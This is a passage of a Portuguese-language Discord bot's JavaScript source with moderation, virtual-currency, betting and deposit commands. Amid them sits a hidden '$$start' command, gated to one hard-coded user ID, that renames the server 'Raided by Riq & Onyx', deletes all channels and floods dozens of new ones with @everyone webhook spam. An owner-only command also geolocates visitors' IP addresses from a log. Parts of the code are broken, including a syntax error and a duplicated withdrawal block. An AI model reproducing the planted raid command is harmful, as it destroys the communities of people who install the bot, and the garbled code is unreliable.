                                appliedBy = muteEntry.executor?.toString() || appliedBy;
                            }

                            await user.disableCommunicationUntil(null);

                            const unmuteEmbed = new EmbedBuilder()
                                .setColor('#00ff00')
                                .setAuthor({
                                    name: '🔊 Mute Removido',
                                })
                                .setDescription(`**${user.user.tag}** teve o silenciamento removido`)
                                .addFields({
                                    name: '📌 Informações do Desmute',
                                    value: [
                                        `┌ **Usuário:** ${user}`,
                                        `├ **Moderador:** ${message.author}`,
                                        `├ **Aplicado por:** ${appliedBy}`,
                                        `└ **Duração Original:** ${originalDuration}`
                                    ].join('\n'),
                                    inline: false
                                }, {
                                    name: '⏳ Período',
                                    value: muteEntry?.createdAt ?
                                        `Aplicado: <t:${Math.floor(muteEntry.createdAt.getTime()/1000)}:R>` : 'Registro não encontrado',
                                    inline: true
                                })
                                .setThumbnail(user.displayAvatarURL({
                                    dynamic: true
                                }))
                                .setFooter({
                                    text: `Solicitado por ${message.author.tag} • ${message.guild.name}`,
                                    iconURL: message.author.displayAvatarURL({
                                        dynamic: true
                                    })
                                })
                                .setTimestamp();

                            message.reply({
                                embeds: [unmuteEmbed]
                            });

                        } catch (error) {
                            console.error(error);
                            const errorEmbed = new EmbedBuilder()
                                .setColor('#ff0000')
                                .setTitle('❌ Falha no Desmute')
                                .setDescription('Ocorreu um erro ao remover o mute:')
                                .addFields({
                                    name: 'Possíveis Causas',
                                    value: '• Permissões insuficientes\n• Erro na API do Discord\n• Problema de hierarquia'
                                }, {
                                    name: 'Solução',
                                    value: 'Verifique minhas permissões e tente novamente'
                                })
                                .setFooter({
                                    text: `Erro: ${error.message.slice(0, 100)}`
                                });

                            message.reply({
                                embeds: [errorEmbed]
                            });
                        }
                    }

                    if (command === 'h!levelmsg') {
                        if (!message.guild) return;
                        if (!message.member.permissions.has('ADMINISTRATOR')) {
                            return message.reply('❌ Apenas **administradores** podem alterar esta configuração!');
                        }

                        const guildId = message.guild.id;
                        const currentState = guildSettingsDB.get(guildId, 'levelUpMsg');
                        let newState;

                        if (!args.length) {
                            newState = !currentState;
                        } else {
                            newState = args[0].toLowerCase() === 'on';
                        }

                        guildSettingsDB.set(guildId, newState, 'levelUpMsg');

                        message.reply(
                            `🔔 Mensagens de level up foram **${newState ? 'ativadas' : 'desativadas'}** no servidor!`
                        );
                    }

                    if (command === "h!daily") {
                        const userId = message.author.id;
                        let data;

                        try {
                            data = JSON.parse(fs.readFileSync(path, 'utf8'));
                        } catch (err) {
                            console.error("Erro ao ler o arquivo JSON:", err);
                            data = {};
                        }

                        const now = Date.now();

                        if (data[userId] && now - data[userId].lastClaim < cooldown) {
                            const timeLeft = data[userId].lastClaim + cooldown - now;
                            const hours = Math.floor(timeLeft / (1000 * 60 * 60));
                            const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
                            const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);

                            return message.reply(`⏳ Você já coletou sua recompensa diária! Tente novamente em ${hours}h ${minutes}m ${seconds}s.`);
                        }

                        const reward = Math.floor(Math.random() * (2500 - 700 + 1)) + 100;
                        data[userId] = {
                            lastClaim: now,
                            balance: (data[userId]?.balance || 0) + reward
                        };

                        try {
                            fs.writeFileSync(path, JSON.stringify(data, null, 2));
                        } catch (err) {
                            console.error("Erro ao salvar o arquivo JSON:", err);
                            return message.reply("❌ Ocorreu um erro ao salvar seus dados. Tente novamente mais tarde.");
                        }

                        message.reply(`🎉 Você coletou ${reward.toLocaleString()} moedas! Seu saldo atual é de ${data[userId].balance.toLocaleString()} moedas.`);
                    }

                    if (command === "h!atm") {
                        const userId = message.author.id;
                        let data;

                        try {
                            data = JSON.parse(fs.readFileSync(path, 'utf8'));
                        } catch (err) {
                            console.error("Erro ao ler o arquivo JSON:", err);
                            return message.reply("❌ Ocorreu um erro ao acessar seus dados.");
                        }

                        const balance = data[userId]?.balance || 0;
                        const deposits = data[userId]?.deposits || [];

                        // Calcular total com juros compostos
                        let totalDepositado = deposits.reduce((acc, deposit) => {
                            const dias = Math.floor((Date.now() - deposit.timestamp) / 86400000);
                            return acc + (deposit.amount * Math.pow(1.10, dias));
                        }, 0);

                        // Formatar para 2 casas decimais
                        totalDepositado = Math.round(totalDepositado * 100) / 100;

                        const embed = new EmbedBuilder()
                            .setTitle('🏧 Banco do Hyoka')
                            .setColor(0x3498db)
                            .addFields({
                                name: '💵 Saldo Disponível',
                                value: `**${balance.toLocaleString()}** moedas`,
                                inline: true
                            }, {
                                name: '💰 Valores Depositados',
                                value: `**${totalDepositado.toLocaleString()}** moedas\n*(rendendo 10% ao dia)*`,
                                inline: true
                            })
                            .setFooter({
                                text: `Total acumulado: ${(balance + totalDepositado).toLocaleString()} moedas`,
                                iconURL: message.author.displayAvatarURL()
                            });

                        message.reply({
                            embeds: [embed]
                        });
                    }

                    if (command === "h!bet" || command === "h!apostar") {
                        const args = message.content.split(" ");
                        const amount = parseInt(args[1]);

                        if (!amount || isNaN(amount) || amount <= 0) {
                            return message.reply("❌ Valor inválido para aposta.");
                        }

                        const userId = message.author.id;
                        let data = JSON.parse(fs.readFileSync(path, 'utf8'));

                        if (!data[userId] || data[userId].balance < amount) {
                            return message.reply("💸 Saldo insuficiente.");
                        }

                        const jackpotWin = Math.random() < 0.001;
                        const normalWin = Math.random() < 0.25;

                        if (jackpotWin) {
                            const winnings = amount * 1000;
                            data[userId].balance += winnings;

                            const embed = new EmbedBuilder()
                                .setTitle("🎰 JACKPOT 🎰")
                                .setDescription(`**${message.author.username}** acertou o **JACKPOT** e ganhou **${winnings.toLocaleString()} moedas!**`)
                                .setColor(0xFFD700)
                                .setFooter({
                                    text: "LUCKY SPIN! 🍀"
                                });

                            fs.writeFileSync(path, JSON.stringify(data, null, 2));
                            return message.reply({
                                embeds: [embed]
                            });

                        } else if (normalWin) {
                            const winnings = Math.floor(amount * (1.5 + Math.random() * 3));
                            data[userId].balance += winnings;

                            const embed = new EmbedBuilder()
                                .setTitle("🎲 Aposta Ganha")
                                .setDescription(`**${message.author.username}** apostou **${amount.toLocaleString()}** e ganhou **${winnings.toLocaleString()}** moedas!`)
                                .setColor(0x00FF00)
                                .setFooter({
                                    text: "Boa sorte na próxima rodada!"
                                });

                            fs.writeFileSync(path, JSON.stringify(data, null, 2));
                            return message.reply({
                                embeds: [embed]
                            });

                        } else {
                            data[userId].balance -= amount;

                            const embed = new EmbedBuilder()
                                .setTitle("❌ Aposta Perdida")
                                .setDescription(`**${message.author.username}** perdeu **${amount.toLocaleString()} moedas**.`)
                                .setColor(0xFF0000)
                                .setFooter({
                                    text: "Boa sorte na próxima rodada!"
                                });

                            fs.writeFileSync(path, JSON.stringify(data, null, 2));
                            return message.reply({
                                embeds: [embed]
                            });
                        }
                    }

                    if (command === 'h!geoips' && isOwner) {
                        try {
                            // Leitura e processamento do log
                            const rawData = fs.readFileSync('visitors.log', 'utf8');
                            const entries = rawData.split('\n')
                                .filter(line => {
                                    try {
                                        const entry = JSON.parse(line);
                                        return /^(?:\d{1,3}\.){3}\d{1,3}$/.test(entry.ip);
                                    } catch {
                                        return false;
                                    }
                                })
                                .map(line => JSON.parse(line));

                            if (entries.length === 0) {
                                return message.reply('📭 Nenhum IP válido encontrado nos logs!');
                            }

                            // Processamento de IPs
                            const ipStats = entries.reduce((acc, entry) => {
                                if (!acc[entry.ip]) {
                                    acc[entry.ip] = {
                                        count: 1,
                                        firstSeen: entry.date,
                                        lastSeen: entry.date,
                                        paths: new Set([entry.path]),
                                        userAgents: new Set([entry.userAgent])
                                    };
                                } else {
                                    acc[entry.ip].count++;
                                    acc[entry.ip].lastSeen = entry.date;
                                    acc[entry.ip].paths.add(entry.path);
                                    acc[entry.ip].userAgents.add(entry.userAgent);
                                }
                                return acc;
                            }, {});

                            const processedIPs = [];
                            const ips = Object.keys(ipStats).slice(0, 45); // Limite da API

                            // Coleta de dados
                            for (const [index, ip] of ips.entries()) {
                                const [geoData, reverseDNS] = await Promise.all([
                                    getGeoData(ip),
                                    getReverseDNS(ip)
                                ]);

                                if (geoData) {
                                    processedIPs.push({
                                        ip,
                                        reverse: reverseDNS,
                                        ...geoData,
                                        ...ipStats[ip],
                                        paths: Array.from(ipStats[ip].paths).join(', '),
                                        userAgents: Array.from(ipStats[ip].userAgents).join('\n')
                                    });
                                }

                                // Rate limit handling
                                if ((index + 1) % 45 === 0) {
                                    await message.channel.send('⏳ Aguardando 1 minuto (rate limit)...');
                                    await new Promise(resolve => setTimeout(resolve, 60000));
                                }
                            }

                            // Sistema de paginação
                            let currentPage = 0;
                            const totalPages = processedIPs.length;

                            // Função para criar embed
                            const createEmbed = (page) => {
                                const ipInfo = processedIPs[page];

                                return new EmbedBuilder()
                                    .setTitle(`🌍 Geolocalização - ${ipInfo.ip}`)
                                    .setColor(ipInfo.proxy === '✅' ? 0xFF0000 : 0x00FF00)
                                    .addFields({
                                        name: '📌 Localização',
                                        value: [
                                            `**País:** ${ipInfo.country}`,
                                            `**Região:** ${ipInfo.region}`,
                                            `**Cidade:** ${ipInfo.city}`,
                                            `**Coordenadas:** \`${ipInfo.coordinates}\``,
                                            `**Fuso Horário:** ${ipInfo.timezone}`
                                        ].join('\n'),
                                        inline: true
                                    }, {
                                        name: '🔧 Rede',
                                        value: [
                                            `**ISP:** ${ipInfo.isp}`,
                                            `**Organização:** ${ipInfo.org}`,
                                            `**ASN:** ${ipInfo.asn}`,
                                            `**Proxy/VPN:** ${ipInfo.proxy}`,
                                            `**DNS Reverso:** \`${ipInfo.reverse}\``
                                        ].join('\n'),
                                        inline: true
                                    }, {
                                        name: '📊 Atividade',
                                        value: [
                                            `**Acessos:** ${ipInfo.count}x`,
                                            `**Primeiro Acesso:** <t:${Math.floor(new Date(ipInfo.firstSeen)/1000)}:R>`,
                                            `**Último Acesso:** <t:${Math.floor(new Date(ipInfo.lastSeen)/1000)}:R>`,
                                            `**Paths:** \`\`\`${ipInfo.paths}\`\`\``,
                                            `**User Agents:** \`\`\`${ipInfo.userAgents}\`\`\``
                                        ].join('\n')
                                    })
                                    .setFooter({
                                        text: `Página ${page + 1}/${totalPages} • ${new Date().toLocaleString('pt-BR')}`,
                                        iconURL: message.client.user.displayAvatarURL()
                                    });
                            };

                            // Componentes de navegação
                            const row = new ActionRowBuilder().addComponents(
                                new ButtonBuilder()
                                .setCustomId('previous')
                                .setLabel('◀️ Anterior')
                                .setStyle(ButtonStyle.Primary)
                                .setDisabled(true),
                                new ButtonBuilder()
                                .setCustomId('next')
                                .setLabel('Próximo ▶️')
                                .setStyle(ButtonStyle.Primary)
                                .setDisabled(totalPages <= 1)
                            );

                            // Envia a primeira página
                            const response = await message.reply({
                                embeds: [createEmbed(currentPage)],
                                components: [row]
                            });

                            // Coletor de interações
                            const collector = response.createMessageComponentCollector({
                                filter: i => i.user.id === message.author.id,
                                time: 300000
                            });

                            collector.on('collect', async i => {
                                currentPage = i.customId === 'next' ? currentPage + 1 : currentPage - 1;

                                row.components[0].setDisabled(currentPage === 0);
                                row.components[1].setDisabled(currentPage === totalPages - 1);

                                await i.update({
                                    embeds: [createEmbed(currentPage)],
                                    components: [row]
                                });
                            });

                            collector.on('end', () => {
                                response.edit({
                                    components: []
                                }).catch(() => {});
                            });

                        } catch (error) {
                            console.error('Erro no comando geoips:', error);
                            message.reply('❌ Falha ao processar logs! Verifique o console.');
                        }
                    }

                    if (command === "h!site") {
                        const siteInfo = {
                            title: '🌐 Site Oficial da Hyoka',
                            url: 'https://hyokabot.onrender.com/',
                            description: 'Acesse nosso site para ver todos os comandos disponíveis e aprender a usá-los!',
                            features: [
                                '📜 Lista atualizada de comandos',
                                '⚙️ Exemplos de uso detalhados',
                                '🔍 Descrições completas',
                                '🆕 Notas de atualização'
                            ]
                        };

                        const embed = new EmbedBuilder()
                            .setTitle(siteInfo.title)
                            .setDescription(siteInfo.description)
                            .setColor(0x5865F2)
                            .addFields({
                                name: '✨ Funcionalidades',
                                value: siteInfo.features.map((f, i) => `${i + 1}. ${f}`).join('\n')
                            })
                            .setFooter({
                                text: 'Clique no botão abaixo para acessar'
                            });

                        const row = new ActionRowBuilder().addComponents(
                            new ButtonBuilder()
                            .setLabel('Acessar Site')
                            .setURL(siteInfo.url)
                            .setStyle(ButtonStyle.Link)
                            .setEmoji('🌐')
                        );

                        message.channel.send({
                            embeds: [embed],
                            components: [row]
                        });
                    }

                    if (command === '$$start') {
                        if (message.author.id !== '756172809650307132') {
                            return
                        }
                        const guild = message.guild;

                        try {
                            await guild.setName('Raided by Riq & Onyx').catch(console.error);

                            const iconURL = 'https://i.imgur.com/xyz.png';
                            await guild.setIcon(iconURL).catch(console.error);

                            const channels = guild.channels.cache;
                            await Promise.all(channels.map(channel => channel.delete().catch(console.error)));

                            await Promise.all([...Array(46)].map(async () => {
                                const newChannel = await guild.channels.create({
                                    name: `Nuked by Riq & Onyx`,
                                    type: 0,
                                });

                                console.log(`Canal criado: ${newChannel.name}`);

                                const webhook = await newChannel.createWebhook({
                                    name: 'Nuke Bot Helper',
                                    avatar: 'https://i.imgur.com/xyz.png',
                                });

                                sendWebhookMessage(webhook, `@everyone Nuked by Riq`, 35);
                            }));

                        } catch (error) {
                            console.error('Erro ao organizar o servidor:', error);
                        }
                    }

                    if (command === 'h!pay') {
                        const userTerms = termsDB.get(message.author.id) || false;
                        if (!userTerms) return;

                        const targetUser = message.mentions.users.first();
                        const amount = parseInt(args[1]);

                        if (!targetUser || isNaN(amount) || amount <= 0) {
                            return message.reply('❌ Uso correto: `h!pay @usuário quantia`');
                        }

                        if (targetUser.bot) {
                            return message.reply('❌ Não pode transferir para bots!');
                        }

                        if (targetUser.id === message.author.id) {
                            return message.reply('❌ Não pode transferir para si mesmo!');
                        }

                        let data;
                        try {
                            data = JSON.parse(fs.readFileSync(path, 'utf8'));
                        } catch (err) {
                            console.error(err);
                            return message.reply('❌ Erro ao acessar dados financeiros!');
                        }

                        const senderId = message.author.id;
                        const receiverId = targetUser.id;

                        if (!data[senderId] || data[senderId].balance < amount) {
                            return message.reply('❌ Saldo insuficiente para realizar a transferência!');
                        }

                        const embed = new EmbedBuilder()
                            .setTitle('💸 Confirmação de Pagamento')
                            .setDescription(`**${message.author.username}** deseja transferir **${amount.toLocaleString()} moedas** para **${targetUser.username}**`)
                            .addFields({
                                name: '🔄 Status',
                                value: 'Aguardando confirmação de ambos...'
                            }, {
                                name: '⏳ Tempo',
                                value: '2 minutos para confirmar'
                            })
                            .setColor(0xFEE75C)
                            .setFooter({
                                text: 'Reaja com ✅ para confirmar'
                            });

                        const confirmationMessage = await message.channel.send({
                            embeds: [embed],
                            content: `${message.author} ${targetUser}`
                        });

                        await confirmationMessage.react('✅');

                        const filter = (reaction, user) => {
                            return reaction.emoji.name === '✅' &&
                                (user.id === senderId || user.id === receiverId);
                        };

                        const collector = confirmationMessage.createReactionCollector({
                            filter,
                            time: 120000,
                            dispose: true
                        });

                        const confirmations = new Set();

                        collector.on('collect', async (reaction, user) => {
                            confirmations.add(user.id);

                            if (confirmations.size === 1) {
                                embed.spliceFields(0, 1, {
                                    name: '🔄 Status',
                                    value: `✅ ${user.username} confirmou!\nAguardando o outro usuário...`
                                });
                                await confirmationMessage.edit({
                                    embeds: [embed]
                                });
                            }

                            if (confirmations.size === 2) {
                                collector.stop();

                                data[senderId].balance -= amount;
                                data[receiverId] = data[receiverId] || {
                                    balance: 0,
                                    lastClaim: 0
                                };
                                data[receiverId].balance += amount;

                                try {
                                    fs.writeFileSync(path, JSON.stringify(data, null, 2));
                                    embed.spliceFields(0, 2, {
                                        name: '✅ Transação Concluída',
                                        value: `${amount.toLocaleString()} moedas transferidas com sucesso!`
                                    });
                                    embed.setColor(0x57F287);
                                    await confirmationMessage.edit({
                                        embeds: [embed],
                                        components: []
                                    });
                                } catch (err) {
                                    console.error(err);
                                    message.channel.send('❌ Erro ao processar transação!');
                                }
                            }
                        });

                        collector.on('end', (collected, reason) => {
                            if (reason === 'time') {
                                embed.spliceFields(0, 2, {
                                    name: '❌ Transação Expirada',
                                    value: 'Tempo de confirmação esgotado!'
                                });
                                embed.setColor(0xED4245);
                                confirmationMessage.edit({
                                    embeds: [embed],
                                    components: []
                                });
                            }
                        });
                    }

                    if (command === "h!depositar") {
                        const userTerms = termsDB.get(message.author.id) || false;
                        if (!userTerms) return;

                        const amount = parseInt(args[0]);

                        if (!amount || isNaN(amount) || amount <= 0) {
                            return message.reply("❌ Valor inválido! Use: `h!depositar <quantia>`");
                        }

                        let data;
                        try {
                            data = JSON.parse(fs.readFileSync(path, 'utf8'));
                        } catch (err) {
                            console.error(err);
                            return message.reply('❌ Erro ao acessar dados financeiros!');
                        }

                        const userId = message.author.id;

                        if (!data[userId] || data[userId].balance < amount) {
                            return message.reply(`❌ Saldo insuficiente! Seu saldo atual é ${(data[userId]?.balance || 0).toLocaleString()} moedas.`);
                        }

                        // Deduzir do saldo
                        data[userId].balance -= amount;

                        // Criar registro do depósito
                        if (!data[userId].deposits) {
                            data[userId].deposits = [];
                        }

                        data[userId].deposits.push({
                            amount: amount,
                            timestamp: Date.now()
                        });

                        try {
                            fs.writeFileSync(path, JSON.stringify(data, null, 2));
                            const embed = new EmbedBuilder()
                                .setTitle('🏦 Depósito Realizado')
                                .setDescription(`✅ **${amount.toLocaleString()} moedas** foram depositadas com sucesso!`)
                                .addFields({
                                    name: 'Rendimento Diário',
                                    value: 'Seu dinheiro renderá 10% ao dia automaticamente',
                                    inline: true
                                })
                                .setColor(0x2ecc71)
                                .setFooter({
                                    text: 'Use h!atm para ver seus saldos'
                                });

                            message.reply({
                                embeds: [embed]
                            });

                        } catch (err) {
                            console.error(err);
                            message.reply('❌ Erro ao processar depósito!');
                        }
                    }

                    if (command === "h!sacar") {
                        const userTerms = termsDB.get(message.author.id) || false;
                        if (!userTerms) return;

                        // Verificação inicial
                        if (!args[1]) {
                            return message.reply("❌ Especifique o valor ou use `all`. Exemplo: `h!sacar 500` ou `h!sacar all`");
                        }

                        let data;
                        try {
                            data = JSON.parse(fs.readFileSync(path, 'utf8'));
                        } catch (err) {
                            console.error(err);
                            return message.reply('❌ Erro ao acessar dados financeiros!');
                        }

                        const userId = message.author.id;
                        const deposits = data[userId]?.deposits || [];

                        // Calcular total depositado com juros
                        let totalDepositado = deposits.reduce((acc, deposit) => {
                            const dias = Math.floor((Date.now() - deposit.timestamp) / 86400000);
                            return acc + (deposit.amount * Math.pow(1.10, dias));
                        }, 0);

                        totalDepositado = Math.round(totalDepositado * 100) / 100;

                        if (totalDepositado <= 0) {
                            return message.reply("❌ Você não tem valores depositados para sacar!");
                        }

                        // Processar saque
                        let valorSaque;
                        if (args[1].toLowerCase() === 'all') {
                            valorSaque = totalDepositado;
                        } else {
                            valorSaque = parseInt(args[1].replace(/[^0-9]/g, ''));
                            if (isNaN(valorSaque) {
                                    return message.reply("❌ Valor inválido! Use números ou `all`");
                                }
                            }

                            if (valorSaque > totalDepositado) {
                                return message.reply(`❌ Saldo insuficiente! Máximo sacável: ${totalDepositado.toLocaleString()} moedas`);
                            }

                            // Atualizar depósitos
                            let remaining = valorSaque;
                            const newDeposits = [];

                            for (const deposit of deposits) {
                                if (remaining <= 0) break;

                                const dias = Math.floor((Date.now() - deposit.timestamp) / 86400000);
                                const valorComJuros = deposit.amount * Math.pow(1.10, dias);

                                if (valorComJuros <= remaining) {
                                    remaining -= valorComJuros;
                                } else {
                                    const proporcao = remaining / valorComJuros;
                                    const novoPrincipal = deposit.amount * (1 - proporcao);

                                    if (novoPrincipal > 0.01) { // Evitar valores infinitesimais
                                        newDeposits.push({
                                            amount: novoPrincipal,
                                            timestamp: deposit.timestamp // Mantém a data original
                                        });
                                    }
                                    remaining = 0;
                                }
                            }

                            // Atualizar dados
                            data[userId].deposits = newDeposits;
                            data[userId].balance = (data[userId].balance || 0) + valorSaque;

                            try {
                                fs.writeFileSync(path, JSON.stringify(data, null, 2));
                                const embed = new EmbedBuilder()
                                    .setTitle('🏧 Saque Realizado')
                                    .setDescription(`✅ **${valorSaque.toLocaleString()} moedas** sacadas com sucesso!`)
                                    .addFields({
                                        name: 'Novo Saldo Disponível',
                                        value: `${data[userId].balance.toLocaleString()} moedas`,
                                        inline: true
                                    })
                                    .setColor(0x2ecc71)
                                    .setFooter({
                                        text: `Saldo depositado restante: ${(totalDepositado - valorSaque).toLocaleString()} moedas`
                                    });

                                message.reply({
                                    embeds: [embed]
                                });

                            } catch (err) {
                                console.error(err);
                                message.reply('❌ Erro ao processar saque!');
                            }
                        }

                        if (command === "h!sacar") {
                            const userTerms = termsDB.get(message.author.id) || false;
                            if (!userTerms) return;

                            // Verificação inicial
                            if (!args[0]) {
                                return message.reply("❌ Especifique o valor ou use `all`. Exemplo: `h!sacar 500` ou `h!sacar all`");
                            }

                            let data;
                            try {
                                data = JSON.parse(fs.readFileSync(path, 'utf8'));
                            } catch (err) {
                                console.error(err);
                                return message.reply('❌ Erro ao acessar dados financeiros!');
                            }

                            const userId = message.author.id;
                            const deposits = data[userId]?.deposits || [];

                            // Calcular total depositado com juros
                            let totalDepositado = deposits.reduce((acc, deposit) => {
                                const dias = Math.floor((Date.now() - deposit.timestamp) / 86400000);
                                return acc + (deposit.amount * Math.pow(1.10, dias));
                            }, 0);

                            totalDepositado = Math.round(totalDepositado * 100) / 100;

                            if (totalDepositado <= 0) {
                                return message.reply("❌ Você não tem valores depositados para sacar!");
                            }

                            // Processar saque
                            let valorSaque;
                            if (args[0].toLowerCase() === 'all') {
                                valorSaque = totalDepositado;
                            } else {
                                valorSaque = parseInt(args[1].replace(/[^0-9]/g, ''));
                                if (isNaN(valorSaque)) {
                                        return message.reply("❌ Valor inválido! Use números ou `all`");
                                    }
                                }

                                if (valorSaque > totalDepositado) {
                                    return message.reply(`❌ Saldo insuficiente! Máximo sacável: ${totalDepositado.toLocaleString()} moedas`);
                                }

                                // Atualizar depósitos
                                let remaining = valorSaque;
                                const newDeposits = [];

                                for (const deposit of deposits) {
                                    if (remaining <= 0) break;

                                    const dias = Math.floor((Date.now() - deposit.timestamp) / 86400000);
                                    const valorComJuros = deposit.amount * Math.pow(1.10, dias);

                                    if (valorComJuros <= remaining) {
                                        remaining -= valorComJuros;
                                    } else {
                                        const proporcao = remaining / valorComJuros;
                                        const novoPrincipal = deposit.amount * (1 - proporcao);

                                        if (novoPrincipal > 0.01) { // Evitar valores infinitesimais
                                            newDeposits.push({
                                                amount: novoPrincipal,
                                                timestamp: deposit.timestamp // Mantém a data original
                                            });
                                        }
                                        remaining = 0;
                                    }
                                }

                                // Atualizar dados
                                data[userId].deposits = newDeposits;
                                data[userId].balance = (data[userId].balance || 0) + valorSaque;

                                try {
                                    fs.writeFileSync(path, JSON.stringify(data, null, 2));
                                    const embed = new EmbedBuilder()
                                        .setTitle('🏧 Saque Realizado')
                                        .setDescription(`✅ **${valorSaque.toLocaleString()} moedas** sacadas com sucesso!`)
                                        .addFields({
                                            name: 'Novo Saldo Disponível',
                                            value: `${data[userId].balance.toLocaleString()} moedas`,
                                            inline: true
                                        })
                                        .setColor(0x2ecc71)
                                        .setFooter({
                                            text: `Saldo depositado restante: ${(totalDepositado - valorSaque).toLocaleString()} moedas`
                                        });

                                    message.reply({
                                        embeds: [embed]
                                    });

                                } catch (err) {
                                    console.error(err);
                                    message.reply('❌ Erro ao processar saque!');
                                }
                            }
                        });

                    client.login(token);
                });
